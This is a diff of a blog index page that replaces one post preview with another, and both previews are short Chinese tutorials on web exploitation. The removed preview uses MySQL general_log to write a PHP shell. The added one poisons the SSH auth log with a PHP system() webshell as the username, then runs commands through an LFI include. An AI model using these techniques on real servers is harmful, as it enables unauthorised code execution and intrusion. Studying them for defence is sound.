@@ -209,17 +209,19 @@
 
 <div class="post-preview">
 
-    <a href="/2017/03/23/mysql日志包含拿shell/">
+    <a href="/2017/03/23/lfi_ssh/">
         <h2 class="post-title">
-            SQL语句利用日志写shell
+            LFI SSH日志
         </h2>
         <h3 class="post-subtitle">
-            前不久刚出的SQL之间利用日志获取SHELL的姿势.
+            通过LFI包含到SSH日志来获取SHELL.
         </h3>
         <div class="post-content-preview">
-            outfile被禁止，或者写入文件被拦截
-
-1234show variables like '%general%';  #查看配置set global general_log = on;  #开启general log模式set global general_log_file = '/var/www/html/1.php';   #设置日志目录为shell地址select '&lt;?php......
+            LFI SSH日志
+1ssh '&lt;?php system($_GET[‘c’]); ?&gt;'@192.168.32.137
+1curl http://192.168.32.137/lfi.php?file=/var/log/auth.log&amp;c=ls
+Tips:
+123/var/log/auth.log只有ubuntu系有。其实对linux，可以包含/var/log/wtm......
         </div>
     </a>
     
@@ -231,7 +233,9 @@
             
               <a href="/tags/#Web" title="Web">Web</a>
             
-              <a href="/tags/#SQL" title="SQL">SQL</a>
+              <a href="/tags/#LFI" title="LFI">LFI</a>
+            
+              <a href="/tags/#SSH" title="SSH">SSH</a>
             
         </div>
     
